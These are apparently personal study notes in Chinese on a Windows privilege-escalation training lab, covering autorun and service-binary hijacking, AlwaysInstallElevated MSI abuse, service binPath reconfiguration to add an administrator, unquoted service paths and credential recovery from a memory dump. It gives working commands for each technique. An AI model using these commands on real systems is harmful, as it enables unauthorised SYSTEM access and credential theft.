# Windows PrivEsc Arena

学完进攻性渗透测试，windows是非常重要的，所以我打算从普通的windows提权开始

---

### 自动运行 提权

    1. 打开命令提示符并键入: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
    2. 在“自动运行”中，单击“登录”选项卡。
    3. 从列出的结果中，请注意“我的程序”条目指向“C：\程序文件\自动运行程序\程序.exe”。
    4. 在命令提示符下键入：C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
    5. 从输出中，请注意“所有人”用户组对“程序.exe”文件具有“FILE_ALL_ACCESS”权限。

我们可以选择使用msfvenom生成反向shell.exe覆盖掉该程序，当用户登录事件触发时，我们将能getshell

---

### 始终最高权限安装 提权

    1.打开命令提示符并键入：reg query HKLM\Software\Policies\Microsoft\Windows\Installer
    2.从输出中，请注意“AlwaysInstallElevated”值为 1。
    3.In 命令提示符类型：reg query HKCU\Software\Policies\Microsoft\Windows\Installer
    4.从输出中，请注意“AlwaysInstallElevated”值为 1。

当该值为1时，这将意味着我们安装msi文件的时候总会以system权限进行，我们可以生成msi的反向shell，当安装该msi文件时，我们将获得system权限的shell

    msiexec /quiet /qn /i C:\Temp\setup.msi

---

### 可执行文件 服务 提权

    accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

请注意，“Everyone”用户组对 filepermservice.exe 文件具有“FILE_ALL_ACCESS”权限。

    1.打开命令提示符并键入: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
    2.在命令提示符下键入：sc start filepermsvc

我们也可以使用msf生成exe-service类型的exe，然后将其覆盖

    msfvenom -f exe-service

---

### 系统启动执行可执行文件提权

    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

如果我们拥有修改和写入权限，我们可以生成shellcode可执行文件并添加此处，当系统启动时，我们将能获得system的shell

---

### service binPath提权

    1. 打开命令提示符并键入：C：\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

请注意，输出表明用户“User-PC\User”拥有“SERVICE_CHANGE_CONFIG”权限。

    sc config daclsvc binpath=“net localgroup administrators user /add”

    sc stop daclsvc
    sc start daclsvc

我们拥有权限，我们可以直接修改binpath，可以是命令，也可以是可执行文件，然后重启服务

我们还可以使用命令：

    sc qc <serviceName>

来查看指定服务的"服务启动用户"

---

### 未带引号的服务路径提权

    sc qc <serviceName>

如果binpath没有被引号包裹，并且路径中还存在空格，那就意味着要出事

例如：C:\Program Files\hack.exe

我们都知道，cmd下执行命令xxx.exe和xxx，都会运行xxx.exe

如果未被引号包裹，假设C:\下存在Program.exe，那么将会执行Program.exe，而空格后的将只是作为参数传入Program.exe

---

### 配置文件

    C:\Windows\Panther\Unattend.xml

---

### 内存转储

1.Open command prompt and type: msfconsole
2.In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
3.In Metasploit (msf > prompt) type: set uripath x
4.In Metasploit (msf > prompt) type: run

Windows VM

1.Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
2.Open command prompt and type: taskmgr
3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.
4.Copy the generated file, iexplore.DMP, to the Kali VM.

Kali VM

1.Place ‘iexplore.DMP’ on the desktop.
2.Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
3.Select the Copy the Base64 encoded string.
4.In command prompt type: echo -ne [Base64 String] | base64 -d
5.Notice the credentials in the output.

---

### 内核漏洞

借助msf扫描器识别存在的漏洞

    post/multi/recon/local_exploit_suggester
